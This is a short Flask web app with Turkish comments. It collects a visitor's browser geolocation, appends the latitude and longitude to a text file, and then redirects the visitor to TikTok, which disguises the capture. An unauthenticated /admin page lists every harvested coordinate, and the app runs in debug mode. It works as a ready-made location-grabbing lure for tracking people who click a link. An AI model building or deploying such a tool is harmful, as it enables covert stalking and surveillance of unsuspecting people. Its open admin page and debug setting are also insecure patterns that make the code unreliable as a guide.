from flask import Flask, render_template, request, redirect, jsonify
import os

app = Flask(__name__)

# Koordinatların kaydedileceği dosya
COORDINATE_FILE = 'coordinates.txt'

# Ana sayfa: Konum izni isteyip koordinatları alacak
@app.route('/')
def index():
    return render_template('index.html')

# Alınan koordinatları işleyen rota
@app.route('/location', methods=['POST'])
def location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')

    # Koordinatları txt dosyasına kaydetme
    with open(COORDINATE_FILE, 'a') as f:
        f.write(f"Latitude: {latitude}, Longitude: {longitude}\n")

    # Koordinatlar alındıktan sonra yönlendirilecek sayfa
    return jsonify(status='success', redirect_url='https://www.tiktok.com')

# Admin sayfası: Kaydedilen koordinatları gösterir
@app.route('/admin')
def admin():
    if os.path.exists(COORDINATE_FILE):
        with open(COORDINATE_FILE, 'r') as f:
            coordinates = f.readlines()
    else:
        coordinates = []

    return render_template('admin.html', coordinates=coordinates)

if __name__ == '__main__':
    app.run(debug=True)
